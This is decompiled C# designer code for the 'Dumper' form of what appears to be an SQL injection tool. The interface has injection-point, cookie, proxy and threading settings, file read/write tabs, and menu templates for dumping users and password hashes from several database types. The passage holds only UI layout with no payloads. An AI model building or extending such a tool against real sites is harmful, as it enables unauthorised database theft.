// Token: 0x02000072 RID: 114
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public partial class Dumper : global::System.Windows.Forms.Form
{
	// Token: 0x0600045C RID: 1116 RVA: 0x0001E690 File Offset: 0x0001C890
	[global::System.Diagnostics.DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.icontainer_0 != null)
			{
				this.icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	// Token: 0x0600045D RID: 1117 RVA: 0x0001E6D4 File Offset: 0x0001C8D4
	[global::System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.icontainer_0 = new global::System.ComponentModel.Container();
		global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Dumper));
		this.tsGetInfo = new global::System.Windows.Forms.ToolStrip();
		this.tsbSchemas_1 = new global::System.Windows.Forms.ToolStripButton();
		this.tscSchemasSP3 = new global::System.Windows.Forms.ToolStripSeparator();
		this.tscSchemas = new global::System.Windows.Forms.ToolStripComboBox();
		this.tscSchemasSP2 = new global::System.Windows.Forms.ToolStripSeparator();
		this.tsbSchemas_0 = new global::System.Windows.Forms.ToolStripButton();
		this.tscSchemasSP = new global::System.Windows.Forms.ToolStripSeparator();
		this.tsbSchemas_3 = new global::System.Windows.Forms.ToolStripButton();
		this.tscSchemasSP1 = new global::System.Windows.Forms.ToolStripSeparator();
		this.tsbSchemas_2 = new global::System.Windows.Forms.ToolStripButton();
		this.btnServerInfo = new global::System.Windows.Forms.ToolStripButton();
		this.lblVersion = new global::System.Windows.Forms.ToolStripLabel();
		this.lblCountry = new global::System.Windows.Forms.ToolStripLabel();
		this.tbcMain = new global::System.Windows.Forms.TabControl();
		this.tpSchema = new global::System.Windows.Forms.TabPage();
		this.splSchema = new global::System.Windows.Forms.SplitContainer();
		this.trwSchema = new global::TreeViewExt();
		this.mnuTree = new global::System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuCountDBs = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountTables = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountTablesAll = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountColumns = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountColumnsAll = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountRows = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountRowsAll = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCountSP = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuCopyDB = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCopyColumn = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCopyTable = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCheckAllSP = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuCheckAllColumns = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuUnCheckAllColumns = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCheckRevert = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuTreeSP1 = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuCopyAllNodes = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCopyAllSchema = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuTreeSP2 = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuClearNodes = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuClearSchema = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuTreeSP3 = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuRemDB = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuRemTable = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuRemColumn = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuTreeSP5 = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuAddDB = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuAddTable = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuAddColumn = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuTreeSP4 = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuCollapseTree = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSortTree = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuAutoScroll = new global::System.Windows.Forms.ToolStripMenuItem();
		this.imgTV = new global::System.Windows.Forms.ImageList(this.icontainer_0);
		this.splWhere = new global::System.Windows.Forms.SplitContainer();
		this.grbWhere = new global::System.Windows.Forms.GroupBox();
		this.txtSchemaWhere = new global::System.Windows.Forms.TextBox();
		this.grbOrderBy = new global::System.Windows.Forms.GroupBox();
		this.txtSchemaOrderBy = new global::System.Windows.Forms.TextBox();
		this.tsConvert1 = new global::System.Windows.Forms.ToolStrip();
		this.btnFiltersClear1 = new global::System.Windows.Forms.ToolStripButton();
		this.btnConvert = new global::System.Windows.Forms.ToolStripDropDownButton();
		this.ctmConvert = new global::System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuConvHex = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuConvChar = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuConvCharGroup = new global::System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem2 = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuConvLEN = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuConvAddA = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuConvert = new global::System.Windows.Forms.ToolStripDropDownButton();
		this.ToolStripDropDownButton1 = new global::System.Windows.Forms.ToolStripDropDownButton();
		this.ctmSchema = new global::System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuSchema0 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema1 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema2 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema3 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema4 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema5 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema6 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema7 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema8 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSchema9 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem12 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.tsSchema = new global::System.Windows.Forms.ToolStrip();
		this.lblCountBDs = new global::System.Windows.Forms.ToolStripLabel();
		this.ToolStripSeparator22 = new global::System.Windows.Forms.ToolStripSeparator();
		this.btnClearSchema = new global::System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator13 = new global::System.Windows.Forms.ToolStripSeparator();
		this.btnDataBases = new global::System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator5 = new global::System.Windows.Forms.ToolStripSeparator();
		this.btnTables = new global::System.Windows.Forms.ToolStripButton();
		this.btnColumns = new global::System.Windows.Forms.ToolStripButton();
		this.btnColumnUp = new global::System.Windows.Forms.ToolStripButton();
		this.btnColumnDown = new global::System.Windows.Forms.ToolStripButton();
		this.btnDumpData = new global::System.Windows.Forms.ToolStripButton();
		this.tpQuery = new global::System.Windows.Forms.TabPage();
		this.splQuery = new global::System.Windows.Forms.SplitContainer();
		this.txtCustomQuery = new global::System.Windows.Forms.TextBox();
		this.lblSelect = new global::System.Windows.Forms.Label();
		this.txtCustomQueryFrom = new global::System.Windows.Forms.TextBox();
		this.lblFrom = new global::System.Windows.Forms.Label();
		this.tsCustomDump = new global::System.Windows.Forms.ToolStrip();
		this.btnDumpCustom = new global::System.Windows.Forms.ToolStripButton();
		this.btnDefCustomQuery = new global::System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator19 = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuTemplates = new global::System.Windows.Forms.ToolStripDropDownButton();
		this.ToolStripSeparator9 = new global::System.Windows.Forms.ToolStripSeparator();
		this.tpMyLoadFile = new global::System.Windows.Forms.TabPage();
		this.grbWriteFile = new global::System.Windows.Forms.GroupBox();
		this.tsMySQLWriteFile = new global::System.Windows.Forms.ToolStrip();
		this.lblWritePath = new global::System.Windows.Forms.ToolStripLabel();
		this.txtMySQLWriteFilePath = new global::System.Windows.Forms.ToolStripTextBox();
		this.ToolStripSeparator1 = new global::System.Windows.Forms.ToolStripSeparator();
		this.cmbMySQLWriteFilePath = new global::System.Windows.Forms.ToolStripComboBox();
		this.ToolStripSeparator3 = new global::System.Windows.Forms.ToolStripSeparator();
		this.btnMySQLWriteFile = new global::System.Windows.Forms.ToolStripButton();
		this.txtMySQLWriteFile = new global::System.Windows.Forms.TextBox();
		this.grbLoadFile = new global::System.Windows.Forms.GroupBox();
		this.tsMySQLReadFile = new global::System.Windows.Forms.ToolStrip();
		this.lblReadPath = new global::System.Windows.Forms.ToolStripLabel();
		this.txtMySQLReadFilePath = new global::System.Windows.Forms.ToolStripTextBox();
		this.ToolStripSeparator4 = new global::System.Windows.Forms.ToolStripSeparator();
		this.cmbMySQLReadFile = new global::System.Windows.Forms.ToolStripComboBox();
		this.ToolStripSeparator6 = new global::System.Windows.Forms.ToolStripSeparator();
		this.btnMySQLReadFile = new global::System.Windows.Forms.ToolStripButton();
		this.tpSearch = new global::System.Windows.Forms.TabPage();
		this.txtSearchColumnResult = new global::System.Windows.Forms.TextBox();
		this.tsSearchColumn = new global::System.Windows.Forms.ToolStrip();
		this.txtSearchColumn = new global::System.Windows.Forms.ToolStripComboBox();
		this.ToolStripSeparator7 = new global::System.Windows.Forms.ToolStripSeparator();
		this.chkSearchColumnAllDBs = new global::System.Windows.Forms.ToolStripButton();
		this.ToolStripSeparator8 = new global::System.Windows.Forms.ToolStripSeparator();
		this.btnSearchColumn = new global::System.Windows.Forms.ToolStripButton();
		this.tpProxies = new global::System.Windows.Forms.TabPage();
		this.imlTabs = new global::System.Windows.Forms.ImageList(this.icontainer_0);
		this.numSleepMultiThread = new global::System.Windows.Forms.NumericUpDown();
		this.lblMultiThreadDelay = new global::System.Windows.Forms.Label();
		this.lblMultiThreadRetry = new global::System.Windows.Forms.Label();
		this.numMaxRetryMultiThread = new global::System.Windows.Forms.NumericUpDown();
		this.numSleep = new global::System.Windows.Forms.NumericUpDown();
		this.lblThreadDelay = new global::System.Windows.Forms.Label();
		this.lblThreadRetry = new global::System.Windows.Forms.Label();
		this.numMaxRetry = new global::System.Windows.Forms.NumericUpDown();
		this.pnlSetupDump = new global::System.Windows.Forms.Panel();
		this.pnlSetupDump2 = new global::System.Windows.Forms.Panel();
		this.tsNewDumpBtn = new global::System.Windows.Forms.ToolStrip();
		this.btnLoadDefautSettings = new global::System.Windows.Forms.ToolStripButton();
		this.btnLoadNewDumper = new global::System.Windows.Forms.ToolStripButton();
		this.grbInjectionPoint = new global::System.Windows.Forms.GroupBox();
		this.lblHeaderValue = new global::System.Windows.Forms.Label();
		this.txtAddHeaderValue = new global::System.Windows.Forms.TextBox();
		this.lblHeaderName = new global::System.Windows.Forms.Label();
		this.txtAddHeaderName = new global::System.Windows.Forms.TextBox();
		this.lblInjectionPointMethod = new global::System.Windows.Forms.Label();
		this.lblInjectionPoint = new global::System.Windows.Forms.Label();
		this.cmbInjectionPoint = new global::System.Windows.Forms.ComboBox();
		this.cmbMethod = new global::System.Windows.Forms.ComboBox();
		this.txtCookies = new global::System.Windows.Forms.TextBox();
		this.txtPost = new global::System.Windows.Forms.TextBox();
		this.lblPost = new global::System.Windows.Forms.Label();
		this.lblCookies = new global::System.Windows.Forms.Label();
		this.chkAddHearder = new global::System.Windows.Forms.CheckBox();
		this.grbLogin = new global::System.Windows.Forms.GroupBox();
		this.txtUserName = new global::System.Windows.Forms.TextBox();
		this.txtPassword = new global::System.Windows.Forms.TextBox();
		this.lblLoginUser = new global::System.Windows.Forms.Label();
		this.lblLoginPassword = new global::System.Windows.Forms.Label();
		this.grbDumpSetup2 = new global::System.Windows.Forms.GroupBox();
		this.chkReDumpFailed = new global::System.Windows.Forms.CheckBox();
		this.chkClearListOnGet = new global::System.Windows.Forms.CheckBox();
		this.chkDumpOrderBy = new global::System.Windows.Forms.CheckBox();
		this.chkDumpWhere = new global::System.Windows.Forms.CheckBox();
		this.grbMySQLSplitRows = new global::System.Windows.Forms.GroupBox();
		this.numMySQLSplitRowsLenght = new global::System.Windows.Forms.NumericUpDown();
		this.Label1 = new global::System.Windows.Forms.Label();
		this.chkMySQLSplitRows = new global::System.Windows.Forms.CheckBox();
		this.numMySQLSplitRows = new global::System.Windows.Forms.NumericUpDown();
		this.grbDumpSetup = new global::System.Windows.Forms.GroupBox();
		this.numLimitX = new global::System.Windows.Forms.NumericUpDown();
		this.numMaxRetryColumn = new global::System.Windows.Forms.NumericUpDown();
		this.lblDumperRetryColumn = new global::System.Windows.Forms.Label();
		this.chkDumpFieldByField = new global::System.Windows.Forms.CheckBox();
		this.lblDumperStartIndex = new global::System.Windows.Forms.Label();
		this.lblDumperMaxRows = new global::System.Windows.Forms.Label();
		this.numFieldByField = new global::System.Windows.Forms.NumericUpDown();
		this.numLimitMax = new global::System.Windows.Forms.NumericUpDown();
		this.grbOracleCollactions = new global::System.Windows.Forms.GroupBox();
		this.chkOracleCastAsChar = new global::System.Windows.Forms.CheckBox();
		this.cmbOracleErrType = new global::System.Windows.Forms.ComboBox();
		this.cmbOracleTopN = new global::System.Windows.Forms.ComboBox();
		this.grbMSSQLCollactions = new global::System.Windows.Forms.GroupBox();
		this.chkMSSQLCastAsChar = new global::System.Windows.Forms.CheckBox();
		this.cmbMSSQLCast = new global::System.Windows.Forms.ComboBox();
		this.chkMSSQL_Latin1 = new global::System.Windows.Forms.CheckBox();
		this.grbMySQLCollactions = new global::System.Windows.Forms.GroupBox();
		this.cmbMySQLErrType = new global::System.Windows.Forms.ComboBox();
		this.cmbMySQLCollations = new global::System.Windows.Forms.ComboBox();
		this.chkDumpIFNULL = new global::System.Windows.Forms.CheckBox();
		this.chkDumpEncodedHex = new global::System.Windows.Forms.CheckBox();
		this.chkAllInOneRequest = new global::System.Windows.Forms.CheckBox();
		this.grbSetupCon = new global::System.Windows.Forms.GroupBox();
		this.chkHttpRedirect = new global::System.Windows.Forms.CheckBox();
		this.chkThreads = new global::System.Windows.Forms.CheckBox();
		this.numThreads = new global::System.Windows.Forms.NumericUpDown();
		this.numTimeOut = new global::System.Windows.Forms.NumericUpDown();
		this.lblTimout = new global::System.Windows.Forms.Label();
		this.splData = new global::System.Windows.Forms.SplitContainer();
		this.ctmTemplatesPostgreSQL = new global::System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuPostgreSQL_ListUsers = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuPostgreSQL_Passwords = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuPostgreSQL_Join = new global::System.Windows.Forms.ToolStripMenuItem();
		this.ctmTemplatesOracle = new global::System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuOracleListUsers = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuOracleHashes = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuOracleJoin = new global::System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator24 = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuOracleHelp = new global::System.Windows.Forms.ToolStripMenuItem();
		this.ctmTemplatesMSSQL = new global::System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuSqlLogins = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSqlIsAdmin = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuSQLJoin = new global::System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuSQLHelp = new global::System.Windows.Forms.ToolStripMenuItem();
		this.bckWorker = new global::System.ComponentModel.BackgroundWorker();
		this.tlpUrl = new global::System.Windows.Forms.ToolTip(this.icontainer_0);
		this.ctmTemplatesFilters = new global::System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuFilters1 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters2 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters5 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters6 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters7 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters8 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters9 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters10 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuFilters3 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.bckAlexa = new global::System.ComponentModel.BackgroundWorker();
		this.ctmTemplatesMySQL = new global::System.Windows.Forms.ContextMenuStrip(this.icontainer_0);
		this.mnuUsers = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuPrivileges = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuListDBA = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuHostIP = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuExtraMySQLStuffs2 = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuLoadFile = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuIntoOutfile = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuIntoDumpfile = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuExtraMySQLStuffs = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCheckUser = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuCheckPizza = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuJOIN = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuLENGTH = new global::System.Windows.Forms.ToolStripMenuItem();
		this.mnuLimitXY = new global::System.Windows.Forms.ToolStripMenuItem();
		this.ToolStripSeparator34 = new global::System.Windows.Forms.ToolStripSeparator();
		this.mnuMySQLHelp = new global::System.Windows.Forms.ToolStripMenuItem();
		this.tlsMenu = new global::System.Windows.Forms.ToolStrip();
		this.btnPasteURL = new global::System.Windows.Forms.ToolStripButton();
		this.toolStripSeparator18 = new global::System.Windows.Forms.ToolStripSeparator();
		this.cmbSqlType = new global::System.Windows.Forms.ToolStripComboBox();
		this.ToolStripSeparator2 = new global::System.Windows.Forms.ToolStripSeparator();
		this.tsGetInfo.SuspendLayout();
		this.tbcMain.SuspendLayout();
		this.tpSchema.SuspendLayout();
		((global::System.ComponentModel.ISupportInitialize)this.splSchema).BeginInit();
		this.splSchema.Panel1.SuspendLayout();
		this.splSchema.Panel2.SuspendLayout();
		this.splSchema.SuspendLayout();
		this.mnuTree.SuspendLayout();
		((global::System.ComponentModel.ISupportInitialize)this.splWhere).BeginInit();
		this.splWhere.Panel1.SuspendLayout();
		this.splWhere.Panel2.SuspendLayout();
		this.splWhere.SuspendLayout();
		this.grbWhere.SuspendLayout();
		this.grbOrderBy.SuspendLayout();
		this.tsConvert1.SuspendLayout();
		this.ctmConvert.SuspendLayout();
		this.ctmSchema.SuspendLayout();
		this.tsSchema.SuspendLayout();
		this.tpQuery.SuspendLayout();
		((global::System.ComponentModel.ISupportInitialize)this.splQuery).BeginInit();
		this.splQuery.Panel1.SuspendLayout();
		this.splQuery.Panel2.SuspendLayout();
		this.splQuery.SuspendLayout();
		this.tsCustomDump.SuspendLayout();
		this.tpMyLoadFile.SuspendLayout();
		this.grbWriteFile.SuspendLayout();
		this.tsMySQLWriteFile.SuspendLayout();
		this.grbLoadFile.SuspendLayout();
		this.tsMySQLReadFile.SuspendLayout();
		this.tpSearch.SuspendLayout();
		this.tsSearchColumn.SuspendLayout();
		((global::System.ComponentModel.ISupportInitialize)this.numSleepMultiThread).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.numMaxRetryMultiThread).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.numSleep).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.numMaxRetry).BeginInit();
		this.pnlSetupDump.SuspendLayout();
		this.pnlSetupDump2.SuspendLayout();
		this.tsNewDumpBtn.SuspendLayout();
		this.grbInjectionPoint.SuspendLayout();
		this.grbLogin.SuspendLayout();
		this.grbDumpSetup2.SuspendLayout();
		this.grbMySQLSplitRows.SuspendLayout();
		((global::System.ComponentModel.ISupportInitialize)this.numMySQLSplitRowsLenght).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.numMySQLSplitRows).BeginInit();
		this.grbDumpSetup.SuspendLayout();
		((global::System.ComponentModel.ISupportInitialize)this.numLimitX).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.numMaxRetryColumn).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.numFieldByField).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.numLimitMax).BeginInit();
		this.grbOracleCollactions.SuspendLayout();
		this.grbMSSQLCollactions.SuspendLayout();
		this.grbMySQLCollactions.SuspendLayout();
		this.grbSetupCon.SuspendLayout();
		((global::System.ComponentModel.ISupportInitialize)this.numThreads).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.numTimeOut).BeginInit();
		((global::System.ComponentModel.ISupportInitialize)this.splData).BeginInit();
		this.splData.Panel1.SuspendLayout();
		this.splData.SuspendLayout();
		this.ctmTemplatesPostgreSQL.SuspendLayout();
		this.ctmTemplatesOracle.SuspendLayout();
		this.ctmTemplatesMSSQL.SuspendLayout();
		this.ctmTemplatesFilters.SuspendLayout();
		this.ctmTemplatesMySQL.SuspendLayout();
		this.tlsMenu.SuspendLayout();
		base.SuspendLayout();
		this.tsGetInfo.GripStyle = global::System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsGetInfo.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.tsGetInfo.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.tsbSchemas_1,
			this.tscSchemasSP3,
			this.tscSchemas,
			this.tscSchemasSP2,
			this.tsbSchemas_0,
			this.tscSchemasSP,
			this.tsbSchemas_3,
			this.tscSchemasSP1,
			this.tsbSchemas_2,
			this.btnServerInfo,
			this.lblVersion,
			this.lblCountry
		});
		this.tsGetInfo.Location = new global::System.Drawing.Point(0, 33);
		this.tsGetInfo.Name = "tsGetInfo";
		this.tsGetInfo.Padding = new global::System.Windows.Forms.Padding(0, 0, 2, 0);
		this.tsGetInfo.RenderMode = global::System.Windows.Forms.ToolStripRenderMode.System;
		this.tsGetInfo.Size = new global::System.Drawing.Size(1762, 33);
		this.tsGetInfo.TabIndex = 16;
		this.tsGetInfo.Text = "ToolStrip2";
		this.tsbSchemas_1.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.tsbSchemas_1.Image = global::ns0.Class6.ProjectSystemModelRefresh_16x_24;
		this.tsbSchemas_1.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.tsbSchemas_1.Name = "tsbSchemas_1";
		this.tsbSchemas_1.Size = new global::System.Drawing.Size(28, 30);
		this.tsbSchemas_1.Text = "Refresh Dir..";
		this.tscSchemasSP3.Name = "tscSchemasSP3";
		this.tscSchemasSP3.Size = new global::System.Drawing.Size(6, 33);
		this.tscSchemas.DropDownStyle = global::System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.tscSchemas.MaxDropDownItems = 30;
		this.tscSchemas.Name = "tscSchemas";
		this.tscSchemas.Size = new global::System.Drawing.Size(178, 33);
		this.tscSchemasSP2.Name = "tscSchemasSP2";
		this.tscSchemasSP2.Size = new global::System.Drawing.Size(6, 33);
		this.tsbSchemas_0.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.tsbSchemas_0.Image = global::ns0.Class6.Entry_16x_24;
		this.tsbSchemas_0.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.tsbSchemas_0.Name = "tsbSchemas_0";
		this.tsbSchemas_0.Size = new global::System.Drawing.Size(28, 30);
		this.tsbSchemas_0.Text = "Load Session";
		this.tscSchemasSP.Name = "tscSchemasSP";
		this.tscSchemasSP.Size = new global::System.Drawing.Size(6, 33);
		this.tsbSchemas_3.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.tsbSchemas_3.Image = global::ns0.Class6.Save_16x_24;
		this.tsbSchemas_3.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.tsbSchemas_3.Name = "tsbSchemas_3";
		this.tsbSchemas_3.Size = new global::System.Drawing.Size(28, 30);
		this.tsbSchemas_3.Text = "&Save Session";
		this.tscSchemasSP1.Name = "tscSchemasSP1";
		this.tscSchemasSP1.Size = new global::System.Drawing.Size(6, 33);
		this.tsbSchemas_2.DisplayStyle = global::System.Windows.Forms.ToolStripItemDisplayStyle.Image;
		this.tsbSchemas_2.Image = global::ns0.Class6.delete;
		this.tsbSchemas_2.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.tsbSchemas_2.Name = "tsbSchemas_2";
		this.tsbSchemas_2.Size = new global::System.Drawing.Size(28, 30);
		this.tsbSchemas_2.Text = "Delete Selected Session";
		this.btnServerInfo.Alignment = global::System.Windows.Forms.ToolStripItemAlignment.Right;
		this.btnServerInfo.ForeColor = global::System.Drawing.SystemColors.ControlText;
		this.btnServerInfo.Image = global::ns0.Class6.Run_16x_24;
		this.btnServerInfo.ImageTransparentColor = global::System.Drawing.Color.Magenta;
		this.btnServerInfo.Name = "btnServerInfo";
		this.btnServerInfo.Size = new global::System.Drawing.Size(158, 30);
		this.btnServerInfo.Text = "&Get Server Info";
		this.btnServerInfo.ToolTipText = " ";
		this.lblVersion.Name = "lblVersion";
		this.lblVersion.Size = new global::System.Drawing.Size(107, 30);
		this.lblVersion.Text = "SQL Version";
		this.lblCountry.Name = "lblCountry";
		this.lblCountry.Size = new global::System.Drawing.Size(75, 30);
		this.lblCountry.Text = "Country";
		this.tbcMain.Controls.Add(this.tpSchema);
		this.tbcMain.Controls.Add(this.tpQuery);
		this.tbcMain.Controls.Add(this.tpMyLoadFile);
		this.tbcMain.Controls.Add(this.tpSearch);
		this.tbcMain.Controls.Add(this.tpProxies);
		this.tbcMain.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.tbcMain.ImageList = this.imlTabs;
		this.tbcMain.Location = new global::System.Drawing.Point(0, 0);
		this.tbcMain.Name = "tbcMain";
		this.tbcMain.SelectedIndex = 0;
		this.tbcMain.Size = new global::System.Drawing.Size(1399, 1286);
		this.tbcMain.TabIndex = 18;
		this.tpSchema.Controls.Add(this.splSchema);
		this.tpSchema.Controls.Add(this.tsSchema);
		this.tpSchema.ImageIndex = 0;
		this.tpSchema.Location = new global::System.Drawing.Point(4, 29);
		this.tpSchema.Name = "tpSchema";
		this.tpSchema.Padding = new global::System.Windows.Forms.Padding(3);
		this.tpSchema.Size = new global::System.Drawing.Size(1391, 1253);
		this.tpSchema.TabIndex = 0;
		this.tpSchema.Text = "Schema";
		this.tpSchema.UseVisualStyleBackColor = true;
		this.splSchema.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.splSchema.FixedPanel = global::System.Windows.Forms.FixedPanel.Panel2;
		this.splSchema.Location = new global::System.Drawing.Point(3, 35);
		this.splSchema.Name = "splSchema";
		this.splSchema.Panel1.Controls.Add(this.trwSchema);
		this.splSchema.Panel2.Controls.Add(this.splWhere);
		this.splSchema.Panel2.Controls.Add(this.tsConvert1);
		this.splSchema.Size = new global::System.Drawing.Size(1385, 1215);
		this.splSchema.SplitterDistance = 1181;
		this.splSchema.TabIndex = 21;
		this.trwSchema.CheckBoxes = true;
		this.trwSchema.ContextMenuStrip = this.mnuTree;
		this.trwSchema.Dock = global::System.Windows.Forms.DockStyle.Fill;
		this.trwSchema.Font = new global::System.Drawing.Font("Courier New", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		this.trwSchema.FullRowSelect = true;
		this.trwSchema.HideSelection = false;
		this.trwSchema.ImageIndex = 0;
		this.trwSchema.ImageList = this.imgTV;
		this.trwSchema.Location = new global::System.Drawing.Point(0, 0);
		this.trwSchema.Name = "trwSchema";
		this.trwSchema.SelectedImageIndex = 0;
		this.trwSchema.ShowNodeToolTips = true;
		this.trwSchema.Size = new global::System.Drawing.Size(1181, 1215);
		this.trwSchema.TabIndex = 0;
		this.mnuTree.ImageScalingSize = new global::System.Drawing.Size(24, 24);
		this.mnuTree.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
		{
			this.mnuCountDBs,
			this.mnuCountTables,
			this.mnuCountTablesAll,
			this.mnuCountColumns,
			this.mnuCountColumnsAll,
			this.mnuCountRows,
			this.mnuCountRowsAll,
			this.mnuCountSP,
			this.mnuCopyDB,
			this.mnuCopyColumn,
			this.mnuCopyTable,
			this.mnuCheckAllSP,
			this.mnuCheckAllColumns,
			this.mnuUnCheckAllColumns,
			this.mnuCheckRevert,
			this.mnuTreeSP1,
			this.mnuCopyAllNodes,
			this.mnuCopyAllSchema,
			this.mnuTreeSP2,
			this.mnuClearNodes,
			this.mnuClearSchema,
			this.mnuTreeSP3,
			this.mnuRemDB,
			this.mnuRemTable,
			this.mnuRemColumn,
			this.mnuTreeSP5,
			this.mnuAddDB,
			this.mnuAddTable,
			this.mnuAddColumn,
			this.mnuTreeSP4,
			this.mnuCollapseTree,
			this.mnuSortTree,
			this.mnuAutoScroll
